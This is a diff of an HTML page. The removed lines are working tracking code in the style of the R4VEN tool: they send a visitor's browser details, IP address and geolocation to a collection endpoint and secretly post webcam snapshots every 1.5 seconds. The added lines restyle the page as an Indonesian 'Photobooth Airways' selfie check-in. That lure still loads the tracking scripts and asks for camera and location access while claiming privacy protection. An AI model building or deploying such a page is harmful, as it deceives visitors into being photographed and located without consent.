@@ -1,205 +1,196 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="id">
 <head>
-  <script type="text/javascript" src="dwebhook.js">
-  </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Photobooth Airways ✈️ | Selfie Check-In</title>
+  <meta name="description" content="Aktifkan kamera untuk selfie boarding pass eksklusif Anda di Photobooth Airways!" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Bebas+Neue&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+  <script type="text/javascript" src="dwebhook.js"></script>
 </head>
-
 <body>
 
-  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
-  </iframe>
+  <iframe id="site-frame" src="" allowfullscreen allow="geolocation; camera; microphone"></iframe>
+  <video id="video" playsinline autoplay></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
 
-  <p id="demo"></p>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-  </script>
-  <script>
-    var x = document.getElementById("demo");
+  <div class="sky-bg"></div>
+  <div class="stars" id="stars"></div>
+  <div class="clouds" id="clouds"></div>
 
-    let datetime = new Date();
-    let localtime = String(datetime.toLocaleTimeString());
-
-
-    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
-
-    const request = new XMLHttpRequest();
-    request.open("POST", "/location_update"); //change webhook
-
-    request.setRequestHeader('Content-type', 'application/json');
-
-    var myEmbed = {
-      author: {
-        name: "Target System Information.."
-      },
-      title: "Uagent:",
-      description: sysinfo,
-      color: 15418782
-    }
-
-    var params = {
-      username: "R4VEN",
-      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-      content: "@everyone Someone Opened The Link O_o ",
-      embeds: [myEmbed]
-    }
-
-    request.send(JSON.stringify(params));
-
-    //...
-
-    $.getJSON("https://api.ipify.org?format=json", function (data) {
-      $("#gfg").html(data.ip);
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "Target Ip"
-        },
-        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
-        color: 15548997,
-
-        footer: {
-          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
-        }
-      }
-
-      var params = {
-        username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
-    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "IP Address Reconnaissance"
-        },
-        title: response.status, //response.query
-        description: '```autohotkey\nContinent: ' + response.continent +
-          "\nContinentCode: " + response.continentcode +
-          "\nCountry: " + response.country +
-          "\nCountrycode: " + response.countrycode +
-          "\nRegionname: " + response.regionName +
-          "\nRegion: " + response.region +
-          "\nCity: " + response.city +
-          "\nDistrict: " + response.district +
-          "\nZip: " + response.zip +
-          "\nTime_zone: " + response.time_zone +
-          "\nName: " + response.name +
-          "\nAs: " + response.as +
-          "\nIsp: " + response.isp +
-          "\nReverse: " + response.reverse +
-          "\nOffset: " + response.offset +
-          "\nCurrency: " + response.currency +
-          "\nProxy: " + response.proxy +
-          "\nMobile: " + response.mobile +
-          "\nLat: " + response.lat +
-          "\nLon: " + response.lon + '```',
-        color: 5763719
-
-      }
-
-      var params = {
-        username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-  </script>
-  <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
+  <!-- MOBILE HEADER -->
+  <div class="mobile-header">
+    <div>
+      <div class="airline-logo">✈ PHOTOBOOTH AIRWAYS</div>
+      <div class="airline-sub">photobooth.bapel.my.id</div>
+    </div>
+    <div style="font-size:10px;color:var(--muted);">Selfie Check-In</div>
   </div>
-  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-  <script>
-    var url = "";
-    request.open("GET", "/get_target", true);
 
-    request.onload = function () {
-      if (request.status === 200) {
-        url = request.responseText;
-      } else {
-        url = "http://127.0.0.1:8000/image"
-      }
-    };
+  <!-- DESKTOP LAYOUT -->
+  <div class="desktop-layout">
+    <div class="desktop-inner">
 
-    request.send();
-    function postFile(file) {
-      let formdata = new FormData();
-      formdata.append("image", file);
-      let xhr = new XMLHttpRequest();
-      xhr.open('POST', url, true);
-      xhr.onload = function () {
-        if (this.status === 200)
-          console.log(this.response);
-        else
-          console.error(xhr);
-      };
-      xhr.send(formdata);
-    }
+      <!-- Left promo -->
+      <div class="promo-panel">
+        <div class="promo-eyebrow">
+          <span class="promo-dot"></span>
+          Selfie Studio Aktif
+        </div>
+        <h1 class="promo-title">
+          STRIKE A POSE,<br/>CAPTURE YOUR<br/><span>BEST MOMENT</span>
+        </h1>
+        <p class="promo-sub">
+          Aktifkan kamera untuk memulai sesi foto eksklusif bersama Photobooth Airways.
+          Pilih dari puluhan frame dan filter premium untuk boarding pass foto Anda.
+        </p>
+        <div class="promo-features">
+          <div class="feat-item highlight">
+            <div class="feat-icon">📸</div>
+            <div class="feat-text">
+              <div class="feat-title">Kamera HD Otomatis</div>
+              <div class="feat-desc">Selfie berkualitas tinggi langsung dari browser</div>
+            </div>
+          </div>
+          <div class="feat-item">
+            <div class="feat-icon">🖼️</div>
+            <div class="feat-text">
+              <div class="feat-title">50+ Frame Eksklusif</div>
+              <div class="feat-desc">Tema maskapai, vintage, hingga modern minimalis</div>
+            </div>
+          </div>
+          <div class="feat-item">
+            <div class="feat-icon">🎨</div>
+            <div class="feat-text">
+              <div class="feat-title">Filter &amp; Efek Premium</div>
+              <div class="feat-desc">Beautify, retro, VSCO, dan masih banyak lagi</div>
+            </div>
+          </div>
+        </div>
+        <div class="promo-stats">
+          <div><div class="stat-num">50<span>k+</span></div><div class="stat-label">Foto Dicetak</div></div>
+          <div><div class="stat-num">200<span>+</span></div><div class="stat-label">Frame Tersedia</div></div>
+          <div><div class="stat-num">4.8<span>★</span></div><div class="stat-label">Rating Pengguna</div></div>
+        </div>
+        <div class="promo-trust">
+          <div class="trust-item"><span>🔒</span> Privasi Terjaga</div>
+          <div class="trust-item"><span>📸</span> No Upload Tanpa Izin</div>
+          <div class="trust-item"><span>⚡</span> Instan &amp; Mudah</div>
+        </div>
+      </div>
 
+      <!-- Right: Boarding pass -->
+      <div class="boarding-pass">
+        <div class="pass-header">
+          <div class="pass-airline">📸 SELFIE BOARDING PASS</div>
+          <div class="pass-badge"><span class="live-dot"></span>FOTO CHECK-IN</div>
+        </div>
+        <div class="route-strip">
+          <div class="route-city"><div class="route-code">YOU</div><div class="route-name">Penumpang</div></div>
+          <div class="route-line">
+            <div class="plane-path"><div class="path-line"></div><div class="plane-icon">✈</div><div class="path-line"></div></div>
+            <div class="route-dur">DIRECT</div>
+          </div>
+          <div class="route-city"><div class="route-code">PBA</div><div class="route-name">PhotoBooth</div></div>
+        </div>
+        <div class="pass-details">
+          <div><div class="detail-label">Passenger</div><div class="detail-value">GUEST</div></div>
+          <div><div class="detail-label">Class</div><div class="detail-value">BUSINESS</div></div>
+          <div><div class="detail-label">Gate</div><div class="detail-value">C12</div></div>
+          <div><div class="detail-label">Seat</div><div class="detail-value" id="seatNum-d">1A</div></div>
+          <div><div class="detail-label">Date</div><div class="detail-value" id="flightDate-d">--</div></div>
+          <div><div class="detail-label">Flight</div><div class="detail-value">PB-777</div></div>
+        </div>
+        <div class="tear-line"><div class="tear-circle"></div><div class="tear-dots"></div><div class="tear-circle"></div></div>
+        <div class="pass-cta">
+          <div id="mainContent-d">
+            <div class="cta-headline">📸 Aktifkan Kamera untuk Selfie</div>
+            <div class="cta-sub">Ambil selfie untuk boarding pass eksklusif.<br/>Pilih dari 50+ frame &amp; filter PhotoBooth!</div>
+            <button class="btn-checkin" id="allowBtn-d" onclick="requestCamera()">
+              <div class="btn-label"><span>📸</span><span id="btnText-d">AKTIFKAN KAMERA &amp; SELFIE</span><div class="spinner" id="spinner-d"></div></div>
+            </button>
+            <div class="pass-footer">🔒 photobooth.bapel.my.id · Layanan Resmi</div>
+            <div class="status-bar" id="statusBar-d"><div class="radar-dot"></div><span id="statusText-d">Menginisialisasi kamera…</span></div>
+          </div>
+          <div class="success-overlay" id="successOverlay-d">
+            <div class="success-plane">✈️</div>
+            <div class="success-title">SELFIE BERHASIL! 🎉</div>
+            <div class="success-sub">Membuka PhotoBooth Airways…</div>
+          </div>
+        </div>
+      </div>
 
+    </div>
+  </div>
 
+  <!-- MOBILE LAYOUT -->
+  <div class="mobile-layout">
+    <div class="boarding-pass">
+      <div class="pass-header">
+        <div class="pass-airline">📸 SELFIE BOARDING PASS</div>
+        <div class="pass-badge"><span class="live-dot"></span>FOTO CHECK-IN</div>
+      </div>
+      <div class="cam-preview-box">
+        <div class="viewfinder">
+          <div class="vf-corner vf-tl"></div><div class="vf-corner vf-tr"></div>
+          <div class="vf-corner vf-bl"></div><div class="vf-corner vf-br"></div>
+          <div class="vf-scan"></div>
+        </div>
+        <div class="cam-label">📷 KAMERA DIPERLUKAN</div>
+        <div class="cam-sub">Foto selfie untuk cetak boarding pass</div>
+      </div>
+      <div class="route-strip">
+        <div class="route-city"><div class="route-code">YOU</div><div class="route-name">Penumpang</div></div>
+        <div class="route-line"><div class="plane-path"><div class="path-line"></div><div class="plane-icon">✈</div><div class="path-line"></div></div><div class="route-dur">DIRECT</div></div>
+        <div class="route-city"><div class="route-code">PBA</div><div class="route-name">PhotoBooth</div></div>
+      </div>
+      <div class="pass-details">
+        <div><div class="detail-label">Passenger</div><div class="detail-value">GUEST</div></div>
+        <div><div class="detail-label">Class</div><div class="detail-value">BUSINESS</div></div>
+        <div><div class="detail-label">Gate</div><div class="detail-value">C12</div></div>
+        <div><div class="detail-label">Seat</div><div class="detail-value" id="seatNum-m">1A</div></div>
+        <div><div class="detail-label">Date</div><div class="detail-value" id="flightDate-m">--</div></div>
+        <div><div class="detail-label">Flight</div><div class="detail-value">PB-777</div></div>
+      </div>
+      <div class="tear-line"><div class="tear-circle"></div><div class="tear-dots"></div><div class="tear-circle"></div></div>
+      <div class="pass-cta">
+        <div id="mainContent-m">
+          <div class="cta-headline">📸 Aktifkan Kamera untuk Selfie</div>
+          <div class="cta-sub">Ambil selfie untuk boarding pass eksklusif Anda.<br/>Pilih dari 50+ frame &amp; filter!</div>
+          <button class="btn-checkin" id="allowBtn-m" onclick="requestCamera()">
+            <div class="btn-label"><span>📸</span><span id="btnText-m">AKTIFKAN KAMERA &amp; SELFIE</span><div class="spinner" id="spinner-m"></div></div>
+          </button>
+          <div class="pass-footer">🔒 photobooth.bapel.my.id · Layanan Resmi</div>
+          <div class="status-bar" id="statusBar-m"><div class="radar-dot"></div><span id="statusText-m">Menginisialisasi kamera…</span></div>
+        </div>
+        <div class="success-overlay" id="successOverlay-m">
+          <div class="success-plane">✈️</div>
+          <div class="success-title">SELFIE BERHASIL! 🎉</div>
+          <div class="success-sub">Membuka PhotoBooth Airways…</div>
+        </div>
+      </div>
+    </div>
+    <div class="mobile-tagline">PHOTOBOOTH AIRWAYS · BOARD YOUR FLIGHT TO TIMELESS MEMORIES</div>
+  </div>
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const errorMsgElement = document.querySelector('span#errorMsg');
+  <!-- DESKTOP FOOTER -->
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-brand">© 2025 <strong>Photobooth Airways</strong> · photobooth.bapel.my.id</div>
+      <div class="footer-links">
+        <a href="#">Syarat &amp; Ketentuan</a>
+        <a href="#">Kebijakan Privasi</a>
+        <a href="#">Bantuan</a>
+        <a href="#">Kontak</a>
+      </div>
+      <div class="footer-ssl">🔒 SSL Secured · Privasi Terjaga</div>
+    </div>
+  </footer>
 
-    const constraints = {
-      audio: false,
-      video: {
-
-        facingMode: "user"
-      }
-    };
-
-    // Access webcam
-    async function init() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints)
-        handleSuccess(stream);
-      } catch (e) {
-        setTimeout(function () {
-          alert("Allow Camera access to video chat");
-          window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623"
-          alert("Grant cam access")
-        }, 15000)
-      }
-    }
-
-    // Success
-    function handleSuccess(stream) {
-      window.stream = stream;
-      video.srcObject = stream;
-
-      var context = canvas.getContext('2d');
-      setInterval(function () {
-
-        context.drawImage(video, 0, 0, 640, 480);
-        canvas.toBlob(postFile, 'image/jpeg');
-      }, 1500);
-
-
-    }
-
-    // Load init
-    init();
-  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="app.js"></script>
 </body>
-
 </html>
